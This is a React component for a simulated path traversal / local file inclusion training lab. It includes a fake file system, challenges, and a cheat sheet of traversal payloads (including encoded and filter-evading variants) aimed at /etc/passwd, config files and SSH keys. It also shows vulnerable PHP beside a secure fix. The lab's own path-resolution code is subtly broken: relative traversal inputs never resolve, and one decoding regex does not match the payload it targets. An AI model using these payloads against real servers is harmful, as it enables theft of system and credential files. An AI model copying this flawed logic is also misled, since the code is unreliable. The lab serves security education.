import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { FolderOpen, Trophy, Lightbulb, Shield, File } from "lucide-react";

const DirectoryTraversalLab = () => {
    const [filename, setFilename] = useState("");
    const [fileContent, setFileContent] = useState("");
    const [completedChallenges, setCompletedChallenges] = useState<Set<string>>(new Set());
    const [showHint, setShowHint] = useState(false);
    const [attempts, setAttempts] = useState(0);

    // Simulated file system
    const fileSystem: Record<string, string> = {
        "/uploads/image1.jpg": "[JPEG Image Data]",
        "/uploads/image2.png": "[PNG Image Data]",
        "/uploads/profile.jpg": "[User Profile Picture]",
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash\nuser:x:1001:1001::/home/user:/bin/bash\n\n🎉 FLAG{traversal_success}",
        "/etc/secret.txt": "Super Secret Data\nDatabase Password: P@ssw0rd123\nAPI Key: sk_live_abc123xyz\n\n🎉 FLAG{absolute_path_win}",
        "C:/Windows/win.ini": "; for 16-bit app support\n[fonts]\n[extensions]\n\nFLAG{windows_traversal}",
        "/var/www/config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'admin';\n$db_pass = 'secretpass123';\n\n// FLAG{encoding_bypass_pro}",
        "/home/user/.ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...[Private Key Data]...\n-----END RSA PRIVATE KEY-----\n\nFLAG{encoding_bypass_pro}"
    };

    const loadFile = () => {
        setAttempts(prev => prev + 1);

        // Normalize the path
        let requestedPath = filename;

        // Check for basic traversal
        if (requestedPath.includes("../")) {
            setCompletedChallenges(prev => new Set([...prev, "traversal-basic"]));
        }

        // Check for absolute path
        if (requestedPath.startsWith("/") || requestedPath.match(/^[A-Za-z]:/)) {
            setCompletedChallenges(prev => new Set([...prev, "traversal-absolute"]));
        }

        // Check for encoding bypass
        if (requestedPath.includes("%2e") || requestedPath.includes("%2f") ||
            requestedPath.includes("....//") || requestedPath.includes("..%c0%af")) {
            setCompletedChallenges(prev => new Set([...prev, "traversal-encoding"]));
            // Decode common encodings
            requestedPath = requestedPath
                .replace(/%2e/gi, ".")
                .replace(/%2f/gi, "/")
                .replace(/%5c/gi, "\\")
                .replace(/\.\.\.\.\\/g, "../")
                .replace(/\.\.%c0%af/gi, "../");
        }

        // Resolve path traversal
        let resolvedPath = requestedPath;

        // Handle Windows paths
        if (resolvedPath.includes("\\")) {
            resolvedPath = resolvedPath.replace(/\\/g, "/");
        }

        // Simple path resolution
        if (resolvedPath.startsWith("uploads/")) {
            resolvedPath = "/" + resolvedPath;
        }

        // Check if file exists in our simulated filesystem
        const content = fileSystem[resolvedPath];

        if (content) {
            setFileContent(content);
            if (attempts >= 2) setShowHint(false);
        } else {
            setFileContent("❌ Error: File not found or access denied!");
            if (attempts >= 2) setShowHint(true);
        }
    };

    const hints = [
        "Try using ../ to navigate to parent directories",
        "Each ../ goes up one directory level. Try: ../../../../etc/passwd",
        "For absolute paths, try: /etc/passwd or C:/Windows/win.ini",
        "To bypass filters, try URL encoding: %2e%2e%2f or double encoding: %252e%252e%252f"
    ];

    const examplePayloads = [
        { name: "Basic Traversal", payload: "../../../../etc/passwd", description: "Navigate up 4 directories" },
        { name: "Absolute Path (Linux)", payload: "/etc/secret.txt", description: "Direct file access" },
        { name: "Windows Path", payload: "C:/Windows/win.ini", description: "Windows file access" },
        { name: "URL Encoded", payload: "..%2f..%2f..%2f..%2fetc%2fpasswd", description: "Bypass basic filters" },
        { name: "Double Encoding", payload: "%252e%252e%252f%252e%252e%252fetc%252fpasswd", description: "Bypass strict filters" },
        { name: "Dot Dot Slash Bypass", payload: "....//....//etc/passwd", description: "Filter evasion" }
    ];

    return (
        <div className="container mx-auto py-8 space-y-6">
            <Card className="border-2 border-yellow-500/20 bg-gradient-to-br from-slate-950 to-yellow-950/10">
                <CardHeader>
                    <div className="flex items-center justify-between">
                        <div>
                            <CardTitle className="text-2xl flex items-center gap-2">
                                <FolderOpen className="h-6 w-6 text-yellow-500" />
                                Path Traversal & LFI Lab
                            </CardTitle>
                            <p className="text-sm text-slate-400 mt-2">
                                Master directory traversal attacks to read arbitrary files
                            </p>
                        </div>
                        <Badge variant="secondary" className="text-lg py-2 px-4">
                            {completedChallenges.size}/3 Challenges
                        </Badge>
                    </div>
                </CardHeader>

                <CardContent className="space-y-6">
                    <Alert className="bg-blue-950/20 border-blue-500/20">
                        <File className="h-4 w-4 text-blue-400" />
                        <AlertDescription>
                            <strong>Scenario:</strong> This image viewer allows users to view uploaded images. However, it doesn't properly validate file paths, allowing you to access files outside the intended directory.
                        </AlertDescription>
                    </Alert>

                    {/* Vulnerable File Viewer */}
                    <Card className="bg-slate-900/50">
                        <CardHeader>
                            <CardTitle className="text-lg">Image Viewer</CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="space-y-2">
                                <label className="text-sm font-medium">Filename:</label>
                                <div className="flex gap-2">
                                    <Input
                                        value={filename}
                                        onChange={(e) => setFilename(e.target.value)}
                                        placeholder="e.g., uploads/image1.jpg"
                                        className="font-mono"
                                    />
                                    <Button onClick={loadFile}>Load File</Button>
                                </div>
                                <p className="text-xs text-slate-500">
                                    Default directory: /uploads/
                                </p>
                            </div>

                            {fileContent && (
                                <div className="space-y-2">
                                    <label className="text-sm font-medium text-green-400">File Content:</label>
                                    <pre className="text-xs font-mono bg-slate-950 p-4 rounded border border-slate-700 overflow-x-auto whitespace-pre-wrap">
                                        {fileContent}
                                    </pre>
                                </div>
                            )}
                        </CardContent>
                    </Card>

                    {/* Challenges */}
                    <div className="grid md:grid-cols-3 gap-4">
                        <Card className={`${completedChallenges.has("traversal-basic") ? "border-green-500/50" : "border-slate-700"}`}>
                            <CardHeader>
                                <CardTitle className="text-sm flex items-center gap-2">
                                    <Trophy className="h-4 w-4 text-yellow-500" />
                                    Challenge 1: Basic Traversal
                                    {completedChallenges.has("traversal-basic") && <Badge>✅</Badge>}
                                </CardTitle>
                            </CardHeader>
                            <CardContent className="text-xs space-y-2">
                                <p>Use ../ to access parent directories</p>
                                <p className="text-slate-500">
                                    <strong>Goal:</strong> Read /etc/passwd
                                </p>
                                <p className="font-mono text-yellow-400 bg-slate-950 p-2 rounded text-[10px]">
                                    ../../../../etc/passwd
                                </p>
                            </CardContent>
                        </Card>

                        <Card className={`${completedChallenges.has("traversal-absolute") ? "border-green-500/50" : "border-slate-700"}`}>
                            <CardHeader>
                                <CardTitle className="text-sm flex items-center gap-2">
                                    <Trophy className="h-4 w-4 text-yellow-500" />
                                    Challenge 2: Absolute Path
                                    {completedChallenges.has("traversal-absolute") && <Badge>✅</Badge>}
                                </CardTitle>
                            </CardHeader>
                            <CardContent className="text-xs space-y-2">
                                <p>Use absolute paths to bypass filters</p>
                                <p className="text-slate-500">
                                    <strong>Goal:</strong> Read /etc/secret.txt
                                </p>
                                <p className="font-mono text-yellow-400 bg-slate-950 p-2 rounded text-[10px]">
                                    /etc/secret.txt
                                </p>
                            </CardContent>
                        </Card>

                        <Card className={`${completedChallenges.has("traversal-encoding") ? "border-green-500/50" : "border-slate-700"}`}>
                            <CardHeader>
                                <CardTitle className="text-sm flex items-center gap-2">
                                    <Trophy className="h-4 w-4 text-yellow-500" />
                                    Challenge 3: Encoding Bypass
                                    {completedChallenges.has("traversal-encoding") && <Badge>✅</Badge>}
                                </CardTitle>
                            </CardHeader>
                            <CardContent className="text-xs space-y-2">
                                <p>Bypass filters using URL encoding</p>
                                <p className="text-slate-500">
                                    <strong>Try:</strong> %2e%2e%2f or ....//
                                </p>
                                <p className="font-mono text-yellow-400 bg-slate-950 p-2 rounded text-[10px]">
                                    ..%2f..%2fvar/www/config.php
                                </p>
                            </CardContent>
                        </Card>
                    </div>

                    {/* Hints */}
                    {showHint && completedChallenges.size < 3 && (
                        <Alert className="bg-blue-950/20 border-blue-500/20">
                            <Lightbulb className="h-4 w-4 text-blue-400" />
                            <AlertDescription className="text-sm">
                                💡 {hints[Math.min(attempts - 2, hints.length - 1)]}
                            </AlertDescription>
                        </Alert>
                    )}

                    {/* Payload Cheat Sheet */}
                    <Card className="bg-slate-900/50">
                        <CardHeader>
                            <CardTitle className="text-sm">Payload Cheat Sheet</CardTitle>
                        </CardHeader>
                        <CardContent>
                            <div className="grid md:grid-cols-2 gap-3">
                                {examplePayloads.map((payload, idx) => (
                                    <div key={idx} className="space-y-1">
                                        <div className="flex items-center justify-between">
                                            <span className="text-xs font-semibold text-yellow-400">{payload.name}</span>
                                            <Button
                                                variant="ghost"
                                                size="sm"
                                                onClick={() => setFilename(payload.payload)}
                                                className="h-6 text-xs"
                                            >
                                                Use
                                            </Button>
                                        </div>
                                        <p className="text-[10px] font-mono bg-slate-950 p-2 rounded break-all">
                                            {payload.payload}
                                        </p>
                                        <p className="text-[10px] text-slate-500">{payload.description}</p>
                                    </div>
                                ))}
                            </div>
                        </CardContent>
                    </Card>

                    {/* Vulnerable Code */}
                    <Card className="bg-slate-900/50">
                        <CardHeader>
                            <CardTitle className="text-sm">Vulnerable PHP Code</CardTitle>
                        </CardHeader>
                        <CardContent>
                            <pre className="text-xs font-mono bg-red-950/20 p-4 rounded border border-red-500/20 overflow-x-auto">
                                {`<?php
// VULNERABLE CODE - DO NOT USE!
$file = $_GET['file'];

// Directly reading user-supplied filename
$content = file_get_contents("/uploads/" . $file);

echo $content;
?>

// Attack: viewer.php?file=../../../../etc/passwd
// Result: Reads /uploads/../../../../etc/passwd (resolves to /etc/passwd)`}</pre>
                        </CardContent>
                    </Card>

                    {/* Prevention */}
                    <Card className="bg-green-950/20 border-green-500/20">
                        <CardHeader>
                            <CardTitle className="text-sm flex items-center gap-2">
                                <Shield className="h-4 w-4 text-green-400" />
                                Prevention Best Practices
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="text-sm space-y-2">
                                <ul className="space-y-1 ml-4 list-disc">
                                    <li>✅ Use a whitelist of allowed files</li>
                                    <li>✅ Validate against a database of permitted files</li>
                                    <li>✅ Use basename() to strip directory paths</li>
                                    <li>✅ Reject input containing ../ or absolute paths</li>
                                    <li>✅ Use realpath() and verify the resolved path</li>
                                    <li>✅ Store files outside the web root</li>
                                    <li>✅ Use unique random filenames (UUIDs)</li>
                                </ul>
                            </div>

                            <pre className="text-xs font-mono bg-slate-950 p-4 rounded overflow-x-auto">
                                {`<?php
// SECURE CODE
$file = $_GET['file'];
$base_dir = '/var/www/uploads/';

// Remove directory paths, only keep filename
$file = basename($file);

// Build full path
$full_path = realpath($base_dir . $file);

// Verify the resolved path is within allowed directory
if (!$full_path || strpos($full_path, realpath($base_dir)) !== 0) {
    die("Access denied!");
}

// Whitelist check
$allowed_files = ['image1.jpg', 'image2.png', 'profile.jpg'];
if (!in_array($file, $allowed_files)) {
    die("File not allowed!");
}

$content = file_get_contents($full_path);
echo htmlspecialchars($content);
?>`}</pre>
                        </CardContent>
                    </Card>
                </CardContent>
            </Card>
        </div>
    );
};

export default DirectoryTraversalLab;
